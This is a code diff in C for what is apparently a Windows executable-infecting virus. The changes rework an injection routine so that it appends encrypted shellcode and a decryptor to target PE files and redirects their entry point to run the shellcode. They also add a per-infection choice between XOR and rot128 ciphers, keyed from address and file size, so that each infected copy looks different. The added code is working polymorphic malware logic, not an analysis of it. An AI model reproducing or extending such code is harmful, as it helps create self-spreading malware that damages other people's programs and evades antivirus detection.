@@ -169,9 +169,10 @@ int inject(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress
 
     // Create new space for the shellcode
     int fileAlignment = getFileAlignment(_CreateFileMappingA, _MapViewOfFile, _UnmapViewOfFile, _CloseHandle, target);
-    HANDLE targetMapping =
-        _CreateFileMappingA(target, NULL, PAGE_READWRITE, 0,
-                            MEM_ALIGN(_GetFileSize(target, NULL) + shellcodeSize + cipher1Size + passing_params_opcode_size, fileAlignment), NULL);
+    int targetFileSize = _GetFileSize(target, NULL);
+
+    HANDLE targetMapping = _CreateFileMappingA(target, NULL, PAGE_READWRITE, 0,
+                                               MEM_ALIGN(targetFileSize + shellcodeSize + passing_params_opcode_size + 100, fileAlignment), NULL);
     LPVOID targetAddress = _MapViewOfFile(targetMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
 
     PIMAGE_DOS_HEADER dosHeader = targetAddress;
@@ -203,21 +204,31 @@ int inject(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress
 
     LPVOID targetDecryptorLocation = (LPVOID)((ULONG_PTR)targetAddress + newSection->PointerToRawData);
 
+    // TODO: can copy opcode from there instead of char array
+    void (*ciphers[])(char *, unsigned int, unsigned long long) = {&xorCipher, &rot128Cipher};
+
+    char *ciphersOpcode[] = {xorCipherOpcode, rot128CipherOpcode};
+    int ciphersSize[] = {xorCipherOpcodeSize, rot128CipherOpcodeSize};
+
+    DWORD64 encryptionKey = (ULONG_PTR)targetDecryptorLocation + ~targetFileSize;
+
+    int cipherId = encryptionKey & 1;
+
     // Passing params to decryptor
     *(PDWORD)((ULONG_PTR)targetDecryptorLocation) = 0xb948;  // mov rcx
-    *(PDWORD64)((ULONG_PTR)targetDecryptorLocation + 2) = cipher1Size;
+    *(PDWORD64)((ULONG_PTR)targetDecryptorLocation + 2) = ciphersSize[cipherId];
 
     *(PDWORD)((ULONG_PTR)targetDecryptorLocation + 10) = 0xba48;  // mov rdx
     *(PDWORD64)((ULONG_PTR)targetDecryptorLocation + 12) = shellcodeSize;
 
     *(PDWORD)((ULONG_PTR)targetDecryptorLocation + 20) = 0xb849;  // mov r8
-    *(PDWORD64)((ULONG_PTR)targetDecryptorLocation + 22) = (ULONG_PTR)targetDecryptorLocation;
+    *(PDWORD64)((ULONG_PTR)targetDecryptorLocation + 22) = encryptionKey;
 
-    // Copy decryptor
-    _RtlCopyMemory((LPVOID)((ULONG_PTR)targetDecryptorLocation + passing_params_opcode_size), cipher1, cipher1Size);
+    // Copy decryptor's body
+    _RtlCopyMemory((LPVOID)((ULONG_PTR)targetDecryptorLocation + passing_params_opcode_size), ciphersOpcode[cipherId], ciphersSize[cipherId]);
 
     // Copy shellcode
-    LPVOID targetEncryptedShellcodeLocation = targetDecryptorLocation + passing_params_opcode_size + cipher1Size;
+    LPVOID targetEncryptedShellcodeLocation = targetDecryptorLocation + passing_params_opcode_size + ciphersSize[cipherId];
 
     // section name != .rssc which means the original injector, no need to decrypt
     if (*(PDWORD64)shellcode->Name != 0x637373722e) {
@@ -228,6 +239,7 @@ int inject(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress
         DWORD64 decryptorSize = *(PDWORD64)((ULONG_PTR)decryptorLocation + 2) + passing_params_opcode_size;
         DWORD64 encryptedShellcodeSize = *(PDWORD64)((ULONG_PTR)decryptorLocation + 12);
         DWORD64 key = *(PDWORD64)((ULONG_PTR)decryptorLocation + 22);
+        int cipherId = key & 1;
 
         LPVOID encryptedShellcodeLocation = decryptorLocation + decryptorSize;
 
@@ -235,25 +247,26 @@ int inject(HANDLE kernel32, protoLoadLibraryA _LoadLibraryA, protoGetProcAddress
         _RtlCopyMemory(targetEncryptedShellcodeLocation, encryptedShellcodeLocation, encryptedShellcodeSize);
 
         // decrypt encrypted shellcode
-        cipher(targetEncryptedShellcodeLocation, encryptedShellcodeSize, key);
+        (*ciphers[cipherId])(targetEncryptedShellcodeLocation, encryptedShellcodeSize, key);
 
         shellcodeSize = encryptedShellcodeSize;
     }
 
     // patch jump relative back to target program's OEP
     *(PDWORD)(targetEncryptedShellcodeLocation + jmpOffset) =
-        ntHeaders->OptionalHeader.AddressOfEntryPoint - (newSection->VirtualAddress + passing_params_opcode_size + cipher1Size + jmpOffset + 4);
+        ntHeaders->OptionalHeader.AddressOfEntryPoint -
+        (newSection->VirtualAddress + passing_params_opcode_size + ciphersSize[cipherId] + jmpOffset + 4);
 
     // encrypt shellcode
-    cipher(targetEncryptedShellcodeLocation, shellcodeSize, (ULONG_PTR)targetDecryptorLocation);
+    (*ciphers[cipherId])(targetEncryptedShellcodeLocation, shellcodeSize, encryptionKey);
 
-    if (tlsInject(targetAddress, newSection->VirtualAddress + ntHeaders->OptionalHeader.ImageBase)) {
+    // if (tlsInject(targetAddress, newSection->VirtualAddress + ntHeaders->OptionalHeader.ImageBase)) {
         // patch jmp to ret
         // *(PDWORD)(dest + jmpOffset - 1) = 0xc3;
-    } else {
+    // } else {
         // Change OEP to shellcode
         ntHeaders->OptionalHeader.AddressOfEntryPoint = newSection->VirtualAddress;
-    }
+    // }
 
     _UnmapViewOfFile(targetAddress);
     _CloseHandle(targetMapping);
